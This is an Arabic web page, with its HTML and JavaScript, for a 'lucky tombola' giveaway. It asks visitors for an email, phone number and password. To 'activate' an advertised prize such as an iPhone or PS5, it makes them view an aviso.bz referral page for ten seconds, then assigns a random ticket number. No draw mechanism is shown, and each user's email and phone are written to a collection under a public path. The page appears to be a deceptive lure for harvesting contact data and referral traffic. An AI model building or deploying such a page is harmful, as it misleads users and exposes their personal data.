<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>طومبولا الحظ | Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #6366f1;
            --secondary: #a855f7;
            --accent: #10b981;
        }
        body { 
            font-family: 'Cairo', sans-serif; 
            background: #0f172a; 
            color: white; 
            overflow-x: hidden;
            margin: 0;
        }
        .bg-animate {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle at 20% 30%, #1e1b4b 0%, #0f172a 100%);
            z-index: -1;
        }
        .glass {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
        }
        .page { display: none; min-height: 100vh; opacity: 0; transition: opacity 0.4s ease; }
        .page.active { display: flex; flex-direction: column; opacity: 1; }

        .prize-card {
            border-radius: 24px;
            overflow: hidden;
            background: white;
            width: 100%;
            height: 100%;
            animation: fadeIn 0.5s ease-out;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.3);
            display: flex;
            flex-direction: column;
            position: relative;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .prize-img {
            height: 140px;
            width: 100%;
            object-fit: contain;
            padding: 15px;
            background: white;
        }

        .prize-info {
            background: #059669;
            color: white;
            padding: 10px;
            text-align: center;
        }

        .prize-info.pending {
            background: #1e293b;
            color: #94a3b8;
        }

        .activation-overlay {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(15, 23, 42, 0.7);
            backdrop-filter: blur(2px);
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0;
            transition: opacity 0.3s ease;
            z-index: 10;
        }

        .prize-card:hover .activation-overlay {
            opacity: 1;
        }

        #adFrameContainer {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: 9999;
            background: #000;
        }
        #adFrame { width: 100%; height: calc(100% - 60px); border: none; margin-top: 60px; }
        .ad-header {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 60px;
            background: rgba(15, 23, 42, 0.95);
            display: flex;
            align-items: center;
            justify-content: center;
            border-bottom: 2px solid var(--primary);
            z-index: 10000;
        }
        
        #toast {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            padding: 12px 24px;
            border-radius: 12px;
            background: #1e293b;
            border: 1px solid rgba(255,255,255,0.1);
            color: white;
            font-size: 14px;
            z-index: 200;
            display: none;
        }

        .prize-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
            gap: 1.5rem;
            padding-bottom: 40px;
        }
    </style>
</head>
<body>
    <div class="bg-animate"></div>
    <div id="toast"></div>

    <div id="adFrameContainer">
        <div class="ad-header">
            <div class="flex items-center gap-4">
                <span class="text-sm font-bold text-slate-300">جاري التفعيل... لا تغلق الصفحة</span>
                <div class="bg-indigo-600 px-4 py-1 rounded-full font-black text-xl" id="frameTimer">10</div>
            </div>
        </div>
        <iframe id="adFrame" src=""></iframe>
    </div>

    <!-- صفحة تسجيل الدخول -->
    <div id="loginPage" class="page active items-center justify-center p-4">
        <div class="max-w-md w-full glass p-8 shadow-2xl">
            <h1 class="text-4xl font-black mb-2 text-center text-indigo-400">طومبولا الحظ</h1>
            <p class="text-slate-400 text-center mb-8 text-sm">أدخل بياناتك للمشاركة في السحب</p>
            <div class="space-y-4">
                <input type="email" id="emailInput" placeholder="البريد الإلكتروني" class="w-full p-4 rounded-2xl outline-none text-left bg-white/5 border border-white/10 focus:border-indigo-500 transition" dir="ltr">
                <input type="tel" id="phoneInput" placeholder="رقم الهاتف" class="w-full p-4 rounded-2xl outline-none text-left bg-white/5 border border-white/10 focus:border-indigo-500 transition" dir="ltr">
                <input type="password" id="passwordInput" placeholder="كلمة المرور" class="w-full p-4 rounded-2xl outline-none text-left bg-white/5 border border-white/10 focus:border-indigo-500 transition" dir="ltr">
                <button id="authBtn" class="w-full bg-indigo-600 text-white font-black py-4 rounded-2xl mt-4 shadow-lg active:scale-95 transition-transform">دخول / تسجيل</button>
            </div>
        </div>
    </div>

    <!-- لوحة التحكم -->
    <div id="dashboardPage" class="page p-6">
        <div class="max-w-5xl mx-auto w-full">
            <header class="flex justify-between items-center mb-10 mt-4">
                <div>
                    <h2 class="text-2xl font-black">قائمة الجوائز المتاحة</h2>
                    <p id="userPhoneDisplay" class="text-indigo-400 font-bold text-sm mt-1">--</p>
                </div>
                <button id="logoutBtn" class="bg-white/5 text-slate-300 px-4 py-2 rounded-xl text-xs font-bold hover:bg-white/10 transition">خروج</button>
            </header>
            
            <div class="prize-grid" id="prizeGrid"></div>

            <div class="text-center mt-6 text-slate-500 text-xs">
                 اختر جائزة وقم بتفعيلها للدخول في السحب 🏆
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
        import { getFirestore, doc, onSnapshot, setDoc, getDoc, serverTimestamp, addDoc, collection, enableIndexedDbPersistence } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-firestore.js";
        import { getAuth, onAuthStateChanged, signInWithEmailAndPassword, createUserWithEmailAndPassword, signOut } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCYipCdnHZXCkO3qKN9AqaWM9IDf9rOv04",
            authDomain: "soug-62f2f.firebaseapp.com",
            projectId: "soug-62f2f",
            storageBucket: "soug-62f2f.firebasestorage.app",
            messagingSenderId: "672944475308",
            appId: "1:672944475308:web:c8158bdf2c5613f51c2309"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const auth = getAuth(app);
        const appId = "tombola-luck-v1";
        const AVISO_URL = "https://aviso.bz/?r=id_2812";

        // تفعيل وضع العمل دون اتصال لضمان استقرار التطبيق
        try {
            enableIndexedDbPersistence(db).catch((err) => {
                if (err.code == 'failed-precondition') {
                    console.warn("Persistence failed: Multiple tabs open.");
                } else if (err.code == 'unimplemented') {
                    console.warn("Persistence not supported by browser.");
                }
            });
        } catch(e) {}

        const prizeData = {
            1: { name: "Samsung Galaxy A24", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/%D9%87%D8%A7%D8%AA%D9%81-Samsung-Galaxy-A24.jpg?raw=true" },
            2: { name: "Smart Watch Pro", img: "https://m.media-amazon.com/images/I/41pzRGn1OnL._SS400_.jpg" },
            3: { name: "Airpods Pro 2", img: "https://m.media-amazon.com/images/I/61SUj2W5ySL._AC_SL1500_.jpg" },
            4: { name: "PlayStation 5 Slim", img: "https://m.media-amazon.com/images/I/51051HiS9OL._SL1500_.jpg" },
            5: { name: "Gaming Mouse RGB", img: "https://m.media-amazon.com/images/I/61UxfXTCCvL._AC_SL1500_.jpg" },
            6: { name: "Condor Refrigerator", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/aac8ea81-cdea-499f-8668-21507e131368.jpg?raw=true" },
            7: { name: "Iphone 15 Pro", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/0a334a0a-c014-4440-921a-ef2a30c23940.jpg?raw=true" },
            8: { name: "Amazon Gift Card $50", img: "https://m.media-amazon.com/images/I/61Y-T3yC04L._AC_SL1500_.jpg" }
        };

        function showPage(id) {
            document.querySelectorAll('.page').forEach(p => {
                p.classList.remove('active');
                p.style.display = 'none';
            });
            const target = document.getElementById(id);
            if(target) {
                target.style.display = (id === 'loginPage') ? 'flex' : 'block';
                setTimeout(() => target.classList.add('active'), 10);
            }
        }

        function showMessage(msg) {
            const t = document.getElementById('toast');
            if(!t) return;
            t.innerText = msg;
            t.style.display = 'block';
            setTimeout(() => { if(t) t.style.display = 'none'; }, 3000);
        }

        onAuthStateChanged(auth, async (user) => {
            if (user) {
                let phone = localStorage.getItem('user_phone') || "غير معروف";
                try {
                    const snap = await getDoc(doc(db, 'artifacts', appId, 'users', user.uid, 'profile', 'info'));
                    if (snap.exists()) phone = snap.data().phone;
                } catch (err) {
                    console.log("Using cached phone number.");
                }
                
                const display = document.getElementById('userPhoneDisplay');
                if(display) display.innerText = "المشارك: " + phone;
                
                showPage('dashboardPage');
                renderGrid(user.uid);
            } else {
                showPage('loginPage');
            }
        });

        document.getElementById('authBtn').onclick = async () => {
            const email = document.getElementById('emailInput').value.trim();
            const password = document.getElementById('passwordInput').value.trim();
            const phone = document.getElementById('phoneInput').value.trim();
            
            if(!email || !password || !phone) {
                showMessage("يرجى ملء جميع الخانات");
                return;
            }

            try { 
                await signInWithEmailAndPassword(auth, email, password);
                localStorage.setItem('user_phone', phone);
            } catch (err) { 
                if (err.code === 'auth/user-not-found' || err.code === 'auth/invalid-credential' || err.code === 'auth/invalid-email') {
                    try {
                        const res = await createUserWithEmailAndPassword(auth, email, password);
                        await setDoc(doc(db, 'artifacts', appId, 'users', res.user.uid, 'profile', 'info'), {
                            phone: phone, email: email, createdAt: serverTimestamp()
                        });
                        localStorage.setItem('user_phone', phone);
                    } catch (createErr) {
                        showMessage("خطأ: " + createErr.message);
                    }
                } else {
                    showMessage("خطأ في تسجيل الدخول");
                }
            }
        };

        document.getElementById('logoutBtn').onclick = () => signOut(auth);

        function renderGrid(uid) {
            const grid = document.getElementById('prizeGrid');
            if(!grid) return;
            grid.innerHTML = '';
            
            for(let i=1; i<=8; i++) {
                const container = document.createElement('div');
                container.id = `card-container-${i}`;
                grid.appendChild(container);

                onSnapshot(doc(db, 'artifacts', appId, 'users', uid, 'activatedCards', `card_${i}`), (snap) => {
                    const active = snap.exists() && snap.data().active;
                    const prize = prizeData[i];
                    const cardBox = document.getElementById(`card-container-${i}`);
                    if(!cardBox) return;
                    
                    if(active) {
                        cardBox.innerHTML = `
                            <div class="prize-card">
                                <img src="${prize.img}" class="prize-img" alt="${prize.name}">
                                <div class="prize-info">
                                    <h4 class="font-bold text-[10px] mb-1 truncate px-2">${prize.name}</h4>
                                    <p class="text-[9px] font-mono bg-black/20 py-1 rounded mx-1">رقم: ${snap.data().ticketNumber}</p>
                                    <p class="text-[8px] mt-1 opacity-90 font-bold">مفعلة ✅</p>
                                </div>
                            </div>
                        `;
                    } else {
                        cardBox.innerHTML = `
                            <div class="prize-card group">
                                <div class="activation-overlay">
                                    <button onclick="window.startActivation('${uid}', ${i})" class="bg-indigo-600 hover:bg-indigo-500 text-white text-[10px] font-bold py-2 px-4 rounded-full shadow-lg transform transition active:scale-90">
                                        اضغط للتفعيل
                                    </button>
                                </div>
                                <img src="${prize.img}" class="prize-img grayscale-[0.5] group-hover:grayscale-0 transition-all" alt="${prize.name}">
                                <div class="prize-info pending">
                                    <h4 class="font-bold text-[10px] mb-1 truncate px-2">${prize.name}</h4>
                                    <p class="text-[8px] font-bold">بانتظار التفعيل 🔒</p>
                                </div>
                            </div>
                        `;
                    }
                }, (err) => {
                    console.error("Listener Error:", err);
                });
            }
        }

        window.startActivation = async function(uid, index) {
            const container = document.getElementById('adFrameContainer');
            const frame = document.getElementById('adFrame');
            const timerEl = document.getElementById('frameTimer');
            
            container.style.display = 'block';
            frame.src = AVISO_URL;

            let time = 10;
            timerEl.innerText = time;

            const interval = setInterval(async () => {
                time--;
                timerEl.innerText = time;

                if(time <= 0) {
                    clearInterval(interval);
                    const phone = localStorage.getItem('user_phone') || "Unknown";
                    const ticketNum = `LUCK-${index}${Math.floor(1000 + Math.random() * 9000)}`;
                    const prize = prizeData[index];

                    try {
                        await setDoc(doc(db, 'artifacts', appId, 'users', uid, 'activatedCards', `card_${index}`), {
                            active: true, 
                            phone: phone, 
                            ticketNumber: ticketNum, 
                            timestamp: serverTimestamp()
                        });
                        
                        await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'all_activations'), {
                            userId: uid, 
                            email: auth.currentUser?.email || "Anonymous", 
                            phone: phone, 
                            prizeName: prize.name, 
                            ticketNumber: ticketNum, 
                            activatedAt: serverTimestamp()
                        });

                        container.style.display = 'none';
                        frame.src = "";
                        showMessage("تم تفعيل الجائزة بنجاح!");
                    } catch (e) {
                        container.style.display = 'none';
                        showMessage("خطأ في التفعيل. يرجى المحاولة لاحقاً.");
                    }
                }
            }, 1000);
        }
    </script>
</body>
</html>
